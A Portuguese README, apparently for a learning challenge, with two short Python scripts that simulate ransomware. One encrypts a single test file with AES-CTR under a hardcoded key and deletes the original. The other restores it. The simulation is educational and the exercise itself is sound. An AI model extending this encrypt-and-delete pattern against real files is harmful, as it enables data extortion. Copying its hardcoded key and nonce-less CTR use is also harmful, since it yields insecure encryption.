# README: Ferramenta de Criptografia e Descriptografia com AES

## Visão Geral
Este projeto implementa um exemplo de criptografia e descriptografia de arquivos utilizando o algoritmo AES (Advanced Encryption Standard) no modo CTR (Counter Mode). Ele demonstra como proteger dados ao criptografar um arquivo e restaurá-los posteriormente por meio de uma chave secreta.

## Recursos
1. **Criptografia de arquivos**: Converte um arquivo de texto em um arquivo criptografado.
2. **Descriptografia de arquivos**: Restaura o arquivo original a partir de sua versão criptografada.
3. **AES no modo CTR**: Um dos modos mais seguros para criptografia de dados, pois gera um fluxo pseudoaleatório para proteger os dados.

---

## Pré-requisitos
Antes de executar os scripts, certifique-se de que os seguintes itens estejam instalados:

- **Python 3**: Certifique-se de que o Python 3 está instalado.
- **Biblioteca pyaes**: Instale a biblioteca `pyaes` usando o comando:
  ```bash
  pip install pyaes
  ```
- **Sistema Operacional**: Desenvolvido e testado no Kali Linux, mas compatível com qualquer sistema operacional que suporte Python.

---

## Estrutura do Projeto
- **`encrypt.py`**: Script responsável por criptografar um arquivo.
- **`decrypt.py`**: Script responsável por descriptografar um arquivo.

---

## Instruções de Uso

### 1. **Criptografia do Arquivo**

Arquivo: `encrypt.py`

Este script criptografa um arquivo de texto, exclui o arquivo original e cria um novo arquivo com o sufixo `.ransomwaretroll`.

#### Fluxo do Código
1. O script abre o arquivo original no modo binário.
2. A chave de 16 bytes é definida.
3. Os dados do arquivo são criptografados usando o algoritmo AES no modo CTR.
4. O arquivo original é excluído.
5. Um novo arquivo criptografado é criado com o nome original e o sufixo `.ransomwaretroll`.

#### Exemplo de Execução
1. Certifique-se de que existe um arquivo `teste.txt` na mesma pasta do script.
2. Execute o script com:
   ```bash
   python encrypt.py
   ```
3. Após a execução:
   - O arquivo `teste.txt` será excluído.
   - Um novo arquivo `teste.txt.ransomwaretroll` será criado com os dados criptografados.

#### Código Base:
```python
import os
import pyaes

file_name = "teste.txt"

try:
    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)

    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_name = f"{file_name}.ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)

    print(f"Arquivo '{file_name}' criptografado com sucesso para '{new_file_name}'.")

except FileNotFoundError:
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
except Exception as e:
    print(f"Ocorreu um erro: {e}")
```

---

### 2. **Descriptografia do Arquivo**

Arquivo: `decrypt.py`

Este script restaura um arquivo criptografado ao descriptografar seus dados e recriar o arquivo original.

#### Fluxo do Código
1. O script abre o arquivo criptografado no modo binário.
2. A mesma chave de 16 bytes usada na criptografia é definida.
3. Os dados do arquivo criptografado são descriptografados usando o algoritmo AES no modo CTR.
4. O arquivo criptografado é excluído.
5. Um novo arquivo é criado com o conteúdo restaurado.

#### Exemplo de Execução
1. Certifique-se de que o arquivo `teste.txt.ransomwaretroll` gerado no processo de criptografia está na mesma pasta do script.
2. Execute o script com:
   ```bash
   python decrypt.py
   ```
3. Após a execução:
   - O arquivo `teste.txt.ransomwaretroll` será excluído.
   - O arquivo original `teste.txt` será recriado com o conteúdo restaurado.

#### Código Base:
```python
import os
import pyaes

file_name = "teste.txt.ransomwaretroll"

try:
    with open(file_name, "rb") as file:
        file_data = file.read()

    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    decrypt_data = aes.decrypt(file_data)

    os.remove(file_name)

    new_file_name = "teste.txt"
    with open(new_file_name, "wb") as new_file:
        new_file.write(decrypt_data)

    print(f"Arquivo '{file_name}' descriptografado com sucesso para '{new_file_name}'.")

except FileNotFoundError:
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
except Exception as e:
    print(f"Ocorreu um erro: {e}")
```

---

## Segurança e Observações

1. **Chave de Criptografia**: A chave utilizada para criptografia e descriptografia deve ser mantida em segurança. Se for perdida, os dados criptografados não poderão ser recuperados.

2. **Remoção de Arquivos**: O script remove os arquivos originais para simular o comportamento de um ransomware. Use com cuidado para evitar perda acidental de dados.

3. **Compatibilidade**: O algoritmo AES exige uma chave com tamanhos específicos (16, 24 ou 32 bytes). Certifique-se de que a chave atende a esse requisito.

4. **Uso Ético**: Este código é fornecido apenas para fins educacionais. O uso indevido deste script pode ser ilegal e é estritamente proibido.

---

## Contato
Se você tiver dúvidas ou precisar de ajuda, sinta-se à vontade para entrar em contato.

---

### Licença
Este projeto é licenciado sob os termos da licença MIT. Consulte o arquivo LICENSE para mais detalhes.

# DesafioDIO_ransomware_Python
